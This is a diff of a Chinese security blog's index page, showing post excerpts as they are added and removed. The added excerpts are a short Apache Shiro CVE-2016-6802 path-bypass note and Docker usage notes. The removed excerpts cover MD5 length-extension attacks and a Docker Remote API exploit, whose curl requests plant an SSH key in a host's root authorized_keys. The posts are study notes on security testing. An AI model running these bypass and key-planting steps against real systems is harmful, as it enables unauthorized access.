@@ -117,6 +117,248 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-10-25  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
+</blockquote>
+<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+WebUtils.java
++ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
+if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
+    contextPath &#x3D; &quot;&quot;;
+ &#125;
+ return contextPath;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
+<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
+</blockquote>
+<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
+<pre class="line-numbers language-none"><code class="language-none">
+WebUtils.java
++ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
+if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
+    contextPath &#x3D; &quot;&quot;;
+ &#125;
+ return contextPath;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
+<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>
+
+	
+	</div>
+  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/10/08/docker.html" >Docker笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-10-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
+<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
+
+<span class="token function">docker</span> run -t -i ubuntu /bin/bash
+<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
+
+<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
+
+<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
+<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
+
+上面两个命令用一个命令代替：
+<span class="token function">docker</span> start -a -i e0521aa52895
+<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
+
+如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
+<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
+
+<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
+<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
+<span class="token comment">#删除所有退出状态的容器</span>
+
+<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
+<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
+<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
+docker exec web ls
+docker start web
+docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
+<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 |docker load
+
+
+docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
+
+ENV ROOT_PATH &#x2F;root
+RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
+WORKDIR $ROOT_PATH
+RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
+WORKDIR &#x2F;root&#x2F;lnmp1.3-full
+RUN echo -e 8e17f72 | bash install.sh
+
+
+EXPOSE 80 3306 9000
+CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
+mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
+mysql -uroot -p
+
+update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
+FLUSH PRIVILEGES;
+quit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<ul>
+<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
+<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>
+
+<span class="token function">docker</span> run -t -i ubuntu /bin/bash
+<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>
+
+<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>
+
+<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
+<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>
+
+上面两个命令用一个命令代替：
+<span class="token function">docker</span> start -a -i e0521aa52895
+<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>
+
+如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
+<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash
+
+<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
+<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
+<span class="token comment">#删除所有退出状态的容器</span>
+
+<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
+<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
+<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
+docker exec web ls
+docker start web
+docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
+<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 |docker load
+
+
+docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
+bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
+<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04
+
+ENV ROOT_PATH &#x2F;root
+RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
+WORKDIR $ROOT_PATH
+RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
+WORKDIR &#x2F;root&#x2F;lnmp1.3-full
+RUN echo -e 8e17f72 | bash install.sh
+
+
+EXPOSE 80 3306 9000
+CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
+mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
+mysql -uroot -p
+
+update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
+FLUSH PRIVILEGES;
+quit
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/09/25/whitehat-talk-web-security.html" >《白帽子讲Web安全》</a>
 		</h3>
 		</div>
@@ -371,152 +613,6 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/07/25/hash-length-attack.html" >MD5哈希长度扩展攻击</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-07-25  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
-</blockquote>
-<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
-<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
-<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
-<ol>
-<li><p>Append Padding Bits</p>
-<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
-</li>
-<li><p>Append Length</p>
-<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
-</li>
-<li><p>计算消息摘</p>
-<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
-</li>
-</ol>
-<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
-<blockquote>
-<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
-</blockquote>
-<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
-	
-
-	</div>
-  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
-</blockquote>
-<p>这篇文章里有提到的哈希长度扩展攻击看了下做个笔记。理解哈希长度扩展攻击以md5为例，需要理解下面几点：</p>
-<h3 id="MD5的部分工作原理"><a href="#MD5的部分工作原理" class="headerlink" title="MD5的部分工作原理"></a>MD5的<strong>部分工作原理</strong></h3><h4 id="一-先看下MD5的计算过程，只需要理解一半："><a href="#一-先看下MD5的计算过程，只需要理解一半：" class="headerlink" title="一. 先看下MD5的计算过程，只需要理解一半："></a>一. 先看下MD5的计算过程，只需要理解一半：</h4><p> 对于一个message进行md5计算的过程是这样的：<br> 经过三个步骤，这部分可以看<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
-<p> The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   先进行补位，使得整体长度对512取模之后的值为448，len(message)%512 == 418，计算单位是bit（位）。</p>
-<ol>
-<li><p>Append Padding Bits</p>
-<p> 补位是这样的，先在message后面加0x80标识，然后加无限个0，一直满足对512bit取模之后等于448bit。</p>
-</li>
-<li><p>Append Length</p>
-<p> 512bit和448相差64bit，即8Byte，这个8字节用来表示补位之前message的长度。</p>
-</li>
-<li><p>计算消息摘</p>
-<p>有一个初始链变量，用来参与第一轮的运算，MD5的初始变量为：<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
-</li>
-</ol>
-<p> 整体来说就是先补位，然后补长度，这个长度占8Byte，用来表示补位之前message的长度，然后计算md5。现在记住下面这句话：</p>
-<blockquote>
-<p>每经过一次消息摘要计算，上面的<strong>链变量会被新的值覆盖</strong>，最后一轮经过高低位互换（aabbccdd -&gt; ddccbbaa）就是最终的MD5值。</p>
-</blockquote>
-<p>现在来进行md5扩展长度攻击：<br>我觉得直接把这个看完就差不多了：<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
-	
-	</div>
-  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-05-18  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Source:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
-<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
-</ul>
-<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
-<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
-<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
-<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
-<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
-<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
-	
-
-	</div>
-  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>Source:</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
-<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
-</ul>
-<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
-<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
-<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
-<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
-<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
-<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
-	
-	</div>
-  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -566,7 +662,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 		
 			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
 		
-			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
 		
 			<li><a href="/categories/Java/">Java<span>8</span></a></li>
 		
@@ -574,7 +670,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -595,6 +691,14 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
+      </li>
+    
+      <li>
+        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
+      </li>
+    
+      <li>
         <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
       </li>
     
@@ -604,14 +708,6 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
     
       <li>
         <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
-      </li>
-    
-      <li>
-        <a href="/2022/04/11/burpsuite-ext-dev.html" ><i class="fa fa-file-o"></i>BurpSuite插件开发注意事项</a>
       </li>
     
   </ul>
@@ -629,7 +725,7 @@ r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class=
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2022 JKme's Blog
+  &copy; 2023 JKme's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
